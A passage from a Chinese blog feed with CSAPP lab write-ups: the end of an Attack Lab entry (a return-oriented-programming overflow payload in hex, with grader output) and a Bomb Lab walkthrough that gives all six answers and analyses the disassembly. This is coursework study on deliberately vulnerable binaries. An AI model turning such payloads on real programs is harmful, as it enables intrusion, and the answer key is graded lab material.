40 00 00 00 00 00\n13 1a 40 00 00 00 00 00\nd6 19 40 00 00 00 00 00\nc5 19 40 00 00 00 00 00\nfa 18 40 00 00 00 00 00\n35 39 62 39 39 37 66 61\n00\n</code></pre>\n<p>最终结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Touch3!: You called touch3(&quot;59b997fa&quot;)\nValid solution for level 3 with target rtarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00\n</code></pre>\n<p>通过！</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ol>\n<li>phase 1 很简单，让 buffer overflow 溢出，然后覆盖返回地址即可</li>\n<li>phase 2 需要让<code>%rdi</code>的值等于<code>cookie</code>的值，我们需要插入一部分自己的攻击代码，比 Phase 1 难度稍微高点</li>\n<li>phase 3 中我们需要插入自己的攻击字符串，然后让<code>ret</code>指令返回到攻击代码开始处，通过指令将<code>%rdi</code>的值设置为攻击字符串的地址，并且把<code>touch3</code>的地址压到栈上。这里的难点在于<code>hexmatch</code>和<code>strncmp</code>中出现了<code>push</code>的压栈操作，并且使用了一段随机的 buffer，如果把攻击字符串放在攻击代码之前，会导致攻击字符串被破坏。因此这里的核心是把攻击字符串放在 caller 函数(<code>test</code>)的栈空间内（在返回地址下面），然后让<code>%rdi</code>指向这里</li>\n<li>phase 4 &amp; phase 5 的难点在于将过程理清楚，并且在<code>rtarget</code>中找到对应的<code>gadget</code>，将栈上作为<code>gadget</code>地址和数值的组合，巧妙地运用<code>popq</code>和<code>ret</code>和其他指令组合出我们想要的操作。</li>\n<li>phase 5 的核心在于首先确定<code>rax = rdi + rsi</code>，并且这两个寄存器一个存储<code>%rsp</code>，一个存储偏移量。要将数据输入到这两个寄存器，随后不断的通过反推，找到以他们为目标地址的指令通用结构，在<code>rtarget</code>中查找到相关指令，然后确定其源寄存器。再来反推什么指令能将数据输送到源寄存器。打通一条通路，然后确定每个 gadget 的地址，最后串联起来就是我们想要的 gadget 列表！这个过程收获很大！</li>\n</ol>\n<p>虽然做这 5 个 Phase 的过程不容易，但是总体来说受益匪浅！</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==\">CSAPP 实验之 attack lab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NzYzOTY0NjU=\">CSAPP | Lab3-Attack Lab 深入解析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=\">csapp-attacklab 详解</span></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "url": "https://salvely.github.io/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "title": "15213 Lab 2-Bomb lab 实验记录",
            "date_published": "2024-02-26T08:49:00.000Z",
            "content_html": "<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>我看见网上非常多的教程里面是一边使用<code>gdb</code>调试（过程中可能引爆炸弹），一边探索结果的。他们可能多次启动了<code>GDB</code>来完成实验。但是我在<code>bomb.c</code>中看到了如下指示:</p>\n<pre><code>No VICTIM may debug, reverse-engineer, run &quot;strings&quot; on, decompile, decrypt, or use any other technique to gain knowledge of and defuse the BOMB.\n</code></pre>\n<p>并且在 CSAPP 3e 的 handout 中也写的很清楚，不应该多次启动 gdb 来通过输入随机序列的方式来探测密码，毕竟解引的机会只有一次。如果引爆炸弹，autolab 的分数会掉。所以正确的方法应该是对汇编程序进行逆向分析，然后推算炸弹的密码，而不是通过多次输入字符串来利用炸弹进行测试。</p>\n<p>不要一开始就开<code>gdb</code>运行<code>phase</code>，可以先启动<code>gdb</code>，在<code>main</code>函数部分打断点，因为很多地方需要从<code>gdb</code>中获取信息，但是我们又不能直接开始做题，因为一做题就无法二次启动<code>gdb</code>了（会扣实验分）。最好是把每个<code>phase</code>都分析透彻，得出确定的答案了，再在<code>gdb</code>中运行，因为中间没有空闲给你打断点和运行，直接进入<code>gets</code>输入了。</p>\n<p>6 道题的答案为（如果用文件输入的话，记得最后有个换行符，否则炸弹爆炸）：</p>\n<pre><code>Border relations with Canada have never been better.\n1 2 4 8 16 32\n0 207\n0 0 DrEvil\nIONEFG\n4 3 2 1 6 5\n20\n</code></pre>\n<h2 id=\"题目浏览\"><a href=\"#题目浏览\" class=\"headerlink\" title=\"题目浏览\"></a>题目浏览</h2><p>首先我们使用<code>wget</code>命令从<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc2FwcC5jcy5jbXUuZWR1LzNlL2xhYnMuaHRtbA==\">实验官网</span>下载<code>tar</code>文件，使用<code>tar xvf bomb.tar</code>解压文件。</p>\n<p>打开文件夹，里面有 2 个重要文件，分别是<code>bomb.c</code>和<code>bomb</code>二进制文件。我们使用<code>objdump -d bomb &gt; bomb.s</code>生成二进制可执行文件的反汇编并存储在<code>bomb.s</code>中。<code>bomb.c</code>中只有<code>main</code>函数的部分，<code>main</code>函数调用的那些函数只在二进制文件和汇编代码中存在。</p>\n<p>我们首先来看<code>bomb.c</code>，其中含有 6 个 phase 的炸弹，我们需要依次解开。在函数最开始处作者声明可以有多种输入格式，可以从<code>stdin</code>获取输入，也可以从文件获取输入。每个 phase 都有如下两行：</p>\n<pre><code class=\"c\">phase_n(input);      /* Run the phase               */\nphase_defused();     /* Drat!  They figured it out!\n</code></pre>\n<h2 id=\"phase1-分析-基础读值\"><a href=\"#phase1-分析-基础读值\" class=\"headerlink\" title=\"phase1 分析: 基础读值\"></a>phase1 分析: 基础读值</h2><p><code>phase_1</code>的汇编代码如下：</p>\n<pre><code>0000000000400ee0 &lt;phase_1&gt;:\n  400ee0:\t48 83 ec 08          \tsub    $0x8,%rsp\n  400ee4:\tbe 00 24 40 00       \tmov    $0x402400,%esi\n  400ee9:\te8 4a 04 00 00       \tcallq  401338 &lt;strings_not_equal&gt;\n  400eee:\t85 c0                \ttest   %eax,%eax\n  400ef0:\t74 05                \tje     400ef7 &lt;phase_1+0x17&gt;\n  400ef2:\te8 43 05 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400ef7:\t48 83 c4 08          \tadd    $0x8,%rsp\n  400efb:\tc3                   \tretq\n</code></pre>\n<p>其过程如下：</p>\n<ol>\n<li>留出 8 个字节的空间</li>\n<li>让<code>%esi = 0x402400</code>，</li>\n<li>调用<code>strings_not_equal</code>函数</li>\n<li>测试<code>%eax</code>是否等于 0</li>\n<li>若返回值为 0，则恢复栈帧，退出</li>\n<li>否则引爆炸弹</li>\n</ol>\n<p>这里推测<code>%esi</code>是给<code>strings_not_equal</code>提供的参数，且<code>string_not_equal</code>返回的是个<code>int</code>类型整数。</p>\n<p>我们打开<code>gdb</code>，打好断点并运行，输入<code>call strings_not_equal(&quot;a&quot;,&quot;a&quot;)</code>发现返回 0。输入<code>call string_length(&quot;a&quot;)</code>发现返回 1。那么<code>strings_not_equal</code>的作用就是判断两字符串是否不相等，<code>string_length</code>的作用就是计算字符串的长度。</p>\n<p>我们的目的是让<code>strings_not_equal</code>返回 0，也就是说我们需要传入两个相同的字符串。那么问题在于我们传入的字符串存储在哪里呢？我们看一下<code>strings_not_equal</code>的反汇编代码：</p>\n<pre><code class=\"asm\">0000000000401338 &lt;strings_not_equal&gt;:\nseg1:\n  401338:\t41 54                \tpush   %r12\n  40133a:\t55                   \tpush   %rbp\n  40133b:\t53                   \tpush   %rbx\n  40133c:\t48 89 fb             \tmov    %rdi,%rbx\n  40133f:\t48 89 f5             \tmov    %rsi,%rbp\n  401342:\te8 d4 ff ff ff       \tcallq  40131b &lt;string_length&gt;\n  401347:\t41 89 c4             \tmov    %eax,%r12d\n  40134a:\t48 89 ef             \tmov    %rbp,%rdi\n  40134d:\te8 c9 ff ff ff       \tcallq  40131b &lt;string_length&gt;\n  401352:\tba 01 00 00 00       \tmov    $0x1,%edx\n\n  401357:\t41 39 c4             \tcmp    %eax,%r12d\n  40135a:\t75 3f                \tjne    40139b &lt;strings_not_equal+0x63&gt;\n  40135c:\t0f b6 03             \tmovzbl (%rbx),%eax\n\n  40135f:\t84 c0                \ttest   %al,%al\n  401361:\t74 25                \tje     401388 &lt;strings_not_equal+0x50&gt;\n\n  401363:\t3a 45 00             \tcmp    0x0(%rbp),%al\n  401366:\t74 0a                \tje     401372 &lt;strings_not_equal+0x3a&gt;\n  401368:\teb 25                \tjmp    40138f &lt;strings_not_equal+0x57&gt;\nseg2:\n  40136a:\t3a 45 00             \tcmp    0x0(%rbp),%al\n  40136d:\t0f 1f 00             \tnopl   (%rax)\n  401370:\t75 24                \tjne    401396 &lt;strings_not_equal+0x5e&gt;\nseg3:\n  401372:\t48 83 c3 01          \tadd    $0x1,%rbx\n  401376:\t48 83 c5 01          \tadd    $0x1,%rbp\n  40137a:\t0f b6 03             \tmovzbl (%rbx),%eax\n\n  40137d:\t84 c0                \ttest   %al,%al\n  40137f:\t75 e9                \tjne    40136a &lt;strings_not_equal+0x32&gt;\n  401381:\tba 00 00 00 00       \tmov    $0x0,%edx\n  401386:\teb 13                \tjmp    40139b &lt;strings_not_equal+0x63&gt;\nseg4:\n  401388:\tba 00 00 00 00       \tmov    $0x0,%edx\n  40138d:\teb 0c                \tjmp    40139b &lt;strings_not_equal+0x63&gt;\nseg5:\n  40138f:\tba 01 00 00 00       \tmov    $0x1,%edx\n  401394:\teb 05                \tjmp    40139b &lt;strings_not_equal+0x63&gt;\nseg6:\n  401396:\tba 01 00 00 00       \tmov    $0x1,%edx\nseg7:\n  40139b:\t89 d0                \tmov    %edx,%eax\n  40139d:\t5b                   \tpop    %rbx\n  40139e:\t5d                   \tpop    %rbp\n  40139f:\t41 5c                \tpop    %r12\n  4013a1:\tc3                   \tretq\n</code></pre>\n<p>其 C 语言代码分析如下：</p>\n<pre><code class=\"c\">seg2()\n&#123;\n    if(al != *rbp) &#123;\n        seg6();\n    &#125;\n    else&#123;\n        seg3();\n    &#125;\n&#125;\n\nseg3()\n&#123;\n    rbx += 1;\n    rbp += 1;\n    eax = *rbx;\n    if(al != 0) &#123;\n        // seg2\n        seg2();\n    &#125;\n    else &#123;\n        edx = 0;\n        seg7();\n    &#125;\n&#125;\n\nseg4()\n&#123;\n    edx = 0;\n    seg7();\n&#125;\n\nseg5()\n&#123;\n    edx = 1;\n    seg7();\n&#125;\n\nseg6() &#123;\n    edx = 1;\n    seg7();\n&#125;\n\nseg7()\n&#123;\n    eax = edx;\n    //还原rbx rbp r12\n    return eax;\n&#125;\n\n// 传入参数有 rdi rsi，返回值在eax中\nint strings_not_equal(char* str)\n&#123;\n    // seg1\n    // 保存r12 rbp rbx的值\n    rbx = rdi\n    rbp = rsi\n    call string_length\n    r12d = eax\n    rdi = rbp\n    call string_length\n    edx = 0x1;\n\n    if(r12d != eax) &#123;\n        seg7();\n    &#125;\n    else &#123;\n        eax = *rbx;\n        if(al == 0) &#123;\n            seg4();\n        &#125;\n        else &#123;\n            if(al == *rbp) &#123;\n                seg3();\n            &#125;\n            else &#123;\n                seg5();\n            &#125;\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<p>我们对调用的函数<code>string_length</code>反汇编看一下：</p>\n<pre><code>000000000040131b &lt;string_length&gt;:\n  40131b:\t80 3f 00             \tcmpb   $0x0,(%rdi)\n  40131e:\t74 12                \tje     401332 &lt;string_length+0x17&gt;\n  401320:\t48 89 fa             \tmov    %rdi,%rdx\n  401323:\t48 83 c2 01          \tadd    $0x1,%rdx\n  401327:\t89 d0                \tmov    %edx,%eax\n  401329:\t29 f8                \tsub    %edi,%eax\n  40132b:\t80 3a 00             \tcmpb   $0x0,(%rdx)\n  40132e:\t75 f3                \tjne    401323 &lt;string_length+0x8&gt;\n  401330:\tf3 c3                \trepz retq\n  401332:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401337:\tc3                   \tretq\n</code></pre>\n<p>其 C 语言转化如下：</p>\n<pre><code class=\"c\">// 传入参数为 rdi，推测其为字符串的首地址\nint string_length()\n&#123;\n    if(*rdi == 0x0) &#123;\n        rax = 0;\n        return rax;\n    &#125;\n    rdx = rdi;\n    do&#123;\n        rdx += 0x1;\n        eax = edx;\n        eax -= edi;\n    &#125;while(*rdx != 0x0);\n    return rax;\n&#125;\n</code></pre>\n<p>因为<code>string_length</code>中传入的应该是字符串首地址，存储在寄存器<code>%rdi</code>中。而<code>strings_not_equal</code>中我们使用了两个寄存器<code>%rdi</code>和<code>%rsi</code>，那么<code>%rsi</code>中保存的应该是第二个字符串的地址。而在<code>phase_1</code>中，我们让<code>%rsi = 0x402400</code>，也就是说<code>0x402400</code>这里有个字符串，我们要让输入的字符串和这里的字符串相同，才能让<code>%rax = 0</code>。</p>\n<p>输入<code>x/s 0x402400</code>，得到如下结果：</p>\n<pre><code>(gdb) x/s 0x402400\n0x402400:       &quot;Border relations with Canada have never been better.&quot;\n</code></pre>\n<p>这就是我们应该在<code>phase_1</code>中输入的字符串了！让我们来试试！结果如下：</p>\n<pre><code>(gdb)\nPhase 1 defused. How about the next one?\n81          printf(&quot;Phase 1 defused. How about the next one?\\n&quot;);\n</code></pre>\n<p>成功！现在准备解决<code>phase_2</code>的问题，<code>gdb</code>先不管。</p>\n<h2 id=\"phase2-分析-分支跳转-循环\"><a href=\"#phase2-分析-分支跳转-循环\" class=\"headerlink\" title=\"phase2 分析: 分支跳转 &amp; 循环\"></a>phase2 分析: 分支跳转 &amp; 循环</h2><p><code>phase_2</code>的反汇编如下：</p>\n<pre><code>0000000000400efc &lt;phase_2&gt;:\n  400efc:\t55                   \tpush   %rbp\n  400efd:\t53                   \tpush   %rbx\n  400efe:\t48 83 ec 28          \tsub    $0x28,%rsp\n  400f02:\t48 89 e6             \tmov    %rsp,%rsi\n  400f05:\te8 52 05 00 00       \tcallq  40145c &lt;read_six_numbers&gt;\n  400f0a:\t83 3c 24 01          \tcmpl   $0x1,(%rsp)\n  400f0e:\t74 20                \tje     400f30 &lt;phase_2+0x34&gt;\n  400f10:\te8 25 05 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400f15:\teb 19                \tjmp    400f30 &lt;phase_2+0x34&gt;\n\n  400f17:\t8b 43 fc             \tmov    -0x4(%rbx),%eax\n  400f1a:\t01 c0                \tadd    %eax,%eax\n  400f1c:\t39 03                \tcmp    %eax,(%rbx)\n  400f1e:\t74 05                \tje     400f25 &lt;phase_2+0x29&gt;\n  400f20:\te8 15 05 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400f25:\t48 83 c3 04          \tadd    $0x4,%rbx\n  400f29:\t48 39 eb             \tcmp    %rbp,%rbx\n  400f2c:\t75 e9                \tjne    400f17 &lt;phase_2+0x1b&gt;\n  400f2e:\teb 0c                \tjmp    400f3c &lt;phase_2+0x40&gt;\n\n  400f30:\t48 8d 5c 24 04       \tlea    0x4(%rsp),%rbx\n  400f35:\t48 8d 6c 24 18       \tlea    0x18(%rsp),%rbp\n  400f3a:\teb db                \tjmp    400f17 &lt;phase_2+0x1b&gt;\n\n  400f3c:\t48 83 c4 28          \tadd    $0x28,%rsp\n  400f40:\t5b                   \tpop    %rbx\n  400f41:\t5d                   \tpop    %rbp\n  400f42:\tc3                   \tretq\n</code></pre>\n<p>我们将其转化为 C 语言试试：</p>\n<pre><code class=\"c\">     // // 400f17\n     // eax = *(rbx - 0x4);\n     // eax *= 2;\n     // if(*rbx == eax) &#123;\n     //     rbx += 4;\n     //     if(rbx != rbp)\n     //         //400f17\n     //     else\n     //         //400f3c\n     //         //恢复栈空间和rbp rbx\n     //         return eax;\n     // &#125;else &#123;\n     //     call explode_bomb\n     // &#125;\nint phase_2()\n&#123;\n    //保存rbp rbx\n    //rsp留出40个字节\n    rsi = rsp;\n    call read_six_numbers\n    if(*rsp == 0x1) &#123;\n        // 400f30\n        rbx = rsp + 0x4;\n        rbp = rsp + 24;\n\n        // 400f17改写为循环\n        do &#123;\n            eax = *(rbx - 0x4);\n            eax *= 2;\n            if(*rbx != eax)\n                call explode_bomb\n            rbx += 4;\n        &#125;while(rbx != rbp)\n        return eax;\n    &#125;\n    else &#123;\n        call explode_bomb\n    &#125;\n&#125;\n</code></pre>\n<p>我们对<code>read_six_numebrs</code>反汇编一下看看：</p>\n<pre><code>000000000040145c &lt;read_six_numbers&gt;:\n  40145c:\t48 83 ec 18          \tsub    $0x18,%rsp\n  401460:\t48 89 f2             \tmov    %rsi,%rdx\n  401463:\t48 8d 4e 04          \tlea    0x4(%rsi),%rcx\n  401467:\t48 8d 46 14          \tlea    0x14(%rsi),%rax\n  40146b:\t48 89 44 24 08       \tmov    %rax,0x8(%rsp)\n  401470:\t48 8d 46 10          \tlea    0x10(%rsi),%rax\n  401474:\t48 89 04 24          \tmov    %rax,(%rsp)\n  401478:\t4c 8d 4e 0c          \tlea    0xc(%rsi),%r9\n  40147c:\t4c 8d 46 08          \tlea    0x8(%rsi),%r8\n  401480:\tbe c3 25 40 00       \tmov    $0x4025c3,%esi\n  401485:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  40148a:\te8 61 f7 ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  40148f:\t83 f8 05             \tcmp    $0x5,%eax\n  401492:\t7f 05                \tjg     401499 &lt;read_six_numbers+0x3d&gt;\n  401494:\te8 a1 ff ff ff       \tcallq  40143a &lt;explode_bomb&gt;\n  401499:\t48 83 c4 18          \tadd    $0x18,%rsp\n  40149d:\tc3                   \tretq\n</code></pre>\n<p>这里也有<code>explode_bomb</code>，有玄机啊~</p>\n<p>先分析<code>read_six_numbers</code>，这里就一个跳转，整个过程容易分析：</p>\n<pre><code>1. 保留 24 个字节的位置\n2. rdx = rsi\n3. rcx = rsi + 0x4\n4. rax = rsi + 20\n5. *(rsp + 8) = rax\n6. rax = rsi + 16\n7. *rsp = rax\n8. r9 = rsi + 12\n9. r8 = rsi + 8\n10. esi = 0x4025c3\n11. eax = 0\n12. call sccanf 获取输入\n13. if(eax &gt; 5) 恢复栈，返回 eax\n14. 否则爆炸\n</code></pre>\n<p>这里传入的应该只有一个参数，就是<code>%rsi</code>寄存器中的值，在前面<code>phase_2</code>里面<code>%rsi = %rsp</code>。那么输入的值应该是从<code>%rsp</code>开始存储。我们使用如下命令打印<code>0x4025c3</code>处的值，得到如下结果：</p>\n<pre><code>(gdb) x/s 0x4025c3\n0x4025c3:       &quot;%d %d %d %d %d %d&quot;\n</code></pre>\n<p>这里<code>%eax</code>中存储的应该是<code>sscanf</code>读入的数据个数，如果<code>%eax &gt; 5</code>的话，<code>read_six_numbers</code>顺利过关，否则爆炸。</p>\n<p>那么数组应该是保存在<code>%rsi</code>指向的位置（也就是一开始<code>%rsp</code>指向的位置），通过分析<code>phase_2</code>的代码，我们可以总结出以下要求：</p>\n<ol>\n<li>输入的第 1 个数必须是 1</li>\n<li>下一个数是前一个数的两倍</li>\n<li>输入 6 个数字，而且是整数，不是浮点数</li>\n</ol>\n<p>那么了解了要求后，我们需要输入<code>1 2 4 8 16 32</code>这 6 个数，看看结果：</p>\n<pre><code>(gdb)\nThat&#39;s number 2.  Keep going!\n88          printf(&quot;That&#39;s number 2.  Keep going!\\n&quot;);\n</code></pre>\n<p><code>phase_2</code>破解成功！我们继续<code>phase_3</code>！</p>\n<h2 id=\"phase3-分析：switch语句\"><a href=\"#phase3-分析：switch语句\" class=\"headerlink\" title=\"phase3 分析：switch语句\"></a>phase3 分析：<code>switch</code>语句</h2><p><code>phase_3</code>的反汇编代码如下：</p>\n<pre><code>0000000000400f43 &lt;phase_3&gt;:\n  400f43:\t48 83 ec 18          \tsub    $0x18,%rsp\n  400f47:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  400f4c:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  400f51:\tbe cf 25 40 00       \tmov    $0x4025cf,%esi\n  400f56:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400f5b:\te8 90 fc ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  400f60:\t83 f8 01             \tcmp    $0x1,%eax\n  400f63:\t7f 05                \tjg     400f6a &lt;phase_3+0x27&gt;\n  400f65:\te8 d0 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400f6a:\t83 7c 24 08 07       \tcmpl   $0x7,0x8(%rsp)\n  400f6f:\t77 3c                \tja     400fad &lt;phase_3+0x6a&gt;\n  400f71:\t8b 44 24 08          \tmov    0x8(%rsp),%eax\n  400f75:\tff 24 c5 70 24 40 00 \tjmpq   *0x402470(,%rax,8)\n  400f7c:\tb8 cf 00 00 00       \tmov    $0xcf,%eax\n  400f81:\teb 3b                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f83:\tb8 c3 02 00 00       \tmov    $0x2c3,%eax\n  400f88:\teb 34                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f8a:\tb8 00 01 00 00       \tmov    $0x100,%eax\n  400f8f:\teb 2d                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f91:\tb8 85 01 00 00       \tmov    $0x185,%eax\n  400f96:\teb 26                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f98:\tb8 ce 00 00 00       \tmov    $0xce,%eax\n  400f9d:\teb 1f                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f9f:\tb8 aa 02 00 00       \tmov    $0x2aa,%eax\n  400fa4:\teb 18                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fa6:\tb8 47 01 00 00       \tmov    $0x147,%eax\n  400fab:\teb 11                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n\n  400fad:\te8 88 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fb2:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400fb7:\teb 05                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fb9:\tb8 37 01 00 00       \tmov    $0x137,%eax\n\n  400fbe:\t3b 44 24 0c          \tcmp    0xc(%rsp),%eax\n  400fc2:\t74 05                \tje     400fc9 &lt;phase_3+0x86&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  400fc9:\t48 83 c4 18          \tadd    $0x18,%rsp\n  400fcd:\tc3                   \tretq\n</code></pre>\n<p><del>这段代码较长，我们将其转化为 C 语言试试</del>：<br>我们先不转化成 C 语言，先来看一下让炸弹爆炸的几个条件。炸弹爆炸出现在如下几个地方：</p>\n<pre><code>  400f65:\te8 d0 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fad:\te8 88 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>对第一处，我们先进行分析：</p>\n<pre><code>  400f43:\t48 83 ec 18          \tsub    $0x18,%rsp\n  400f47:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  400f4c:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  400f51:\tbe cf 25 40 00       \tmov    $0x4025cf,%esi\n  400f56:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400f5b:\te8 90 fc ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  400f60:\t83 f8 01             \tcmp    $0x1,%eax\n  400f63:\t7f 05                \tjg     400f6a &lt;phase_3+0x27&gt;\n  400f65:\te8 d0 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>这段代码首先分配了 24 个字节的栈空间，随后做了如下步骤：</p>\n<ol>\n<li>rcx &#x3D; rsp + 12</li>\n<li>rdx &#x3D; rsp + 8</li>\n<li>esi &#x3D; 0x4025cf</li>\n<li>eax &#x3D; 0</li>\n<li>call sscanf</li>\n<li>将 eax 与 1 进行比较</li>\n<li>如果 eax &gt; 1，跳转到<code>400f6a</code></li>\n<li>否则炸弹爆炸</li>\n</ol>\n<p>这段代码和我们上一段看到的<code>sscanf</code>之前的代码非常相似，<code>0x4025cf</code>多半是一个让你输入一串东西的指令地址，我们看一下<code>%esi(0x4025cf)</code>附近的值等于多少：</p>\n<pre><code>(gdb) x/s 0x4025cf\n0x4025cf:       &quot;%d %d&quot;\n</code></pre>\n<p>这里说明我们需要输入 2 个数字，如果不是输入 2 个数字的话，炸弹就会爆炸。第一个要求明确了。</p>\n<p>再来看第二处炸弹的位置前后的代码，它的上一条代码是个<code>jmp</code>，那么就不可能从那儿执行到这儿来，因为炸弹爆炸了，所以他后面的代码也不可能执行，所以我们只需要看看哪些代码会跳转到这一条(<code>400fad</code>)上来。</p>\n<pre><code>  400f6a:\t83 7c 24 08 07       \tcmpl   $0x7,0x8(%rsp)\n  400f6f:\t77 3c                \tja     400fad &lt;phase_3+0x6a&gt;\n</code></pre>\n<p>这段代码出现在我们获取了两个整数之后。这段代码比较了<code>*(rsp + 8)</code>和<code>0x7</code>的值。为了不跳转到<code>400fad</code>，我们需要让<code>%rsp + 8 &lt;= 0x7</code>。第二个要求明确了。</p>\n<p>最后一个炸弹前的代码如下：</p>\n<pre><code>  400fb9:\tb8 37 01 00 00       \tmov    $0x137,%eax\n\n  400fbe:\t3b 44 24 0c          \tcmp    0xc(%rsp),%eax\n  400fc2:\t74 05                \tje     400fc9 &lt;phase_3+0x86&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>这段代码中实现如下操作：</p>\n<ol>\n<li>eax &#x3D; 0x137</li>\n<li>如果<code>eax != *(rsp + 12)</code>，那么炸弹爆炸，也就是说输入的第二个参数最后必须等于<code>0x137</code></li>\n</ol>\n<p>现在问题来了，有几个代码通过跳转来到了<code>400fbe</code>位置，我们需要分析其情况，看看其是否对<code>%rsp + 12</code>处的值做了操作。</p>\n<pre><code>  400f7c:\tb8 cf 00 00 00       \tmov    $0xcf,%eax -&gt;eax = 0xcf\n  400f81:\teb 3b                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f83:\tb8 c3 02 00 00       \tmov    $0x2c3,%eax -&gt; eax = 0x2c3\n  400f88:\teb 34                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f8a:\tb8 00 01 00 00       \tmov    $0x100,%eax -&gt; eax = 0x100\n  400f8f:\teb 2d                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f91:\tb8 85 01 00 00       \tmov    $0x185,%eax -&gt; eax = 0x185\n  400f96:\teb 26                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f98:\tb8 ce 00 00 00       \tmov    $0xce,%eax -&gt; eax = 0xce\n  400f9d:\teb 1f                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f9f:\tb8 aa 02 00 00       \tmov    $0x2aa,%eax -&gt; eax = 0x2aa\n  400fa4:\teb 18                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fa6:\tb8 47 01 00 00       \tmov    $0x147,%eax -&gt; eax = 0x147\n  400fab:\teb 11                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n\n  400fad:\te8 88 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fb2:\tb8 00 00 00 00       \tmov    $0x0,%eax -&gt; eax = 0\n  400fb7:\teb 05                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fb9:\tb8 37 01 00 00       \tmov    $0x137,%eax -&gt; eax = 0x137\n\n  400fbe:\t3b 44 24 0c          \tcmp    0xc(%rsp),%eax\n  400fc2:\t74 05                \tje     400fc9 &lt;phase_3+0x86&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>要注意的是指令<code>400f75:\tff 24 c5 70 24 40 00 \tjmpq   *0x402470(,%rax,8)</code>中实现的是间接跳转（因为加了<code>*</code>），那么我们需要找到<code>0x402470</code>处的 8 字节地址，以它为跳转的基地址。</p>\n<pre><code>(gdb) x/wx 0x402470\n0x402470:       0x00400f7c\n</code></pre>\n<p>这个地址就是<code>0x400f7c</code>。我们前面把输入的第一个数字移到了<code>%eax</code>，那么我们需要通过<code>0x400f7c + 8 * 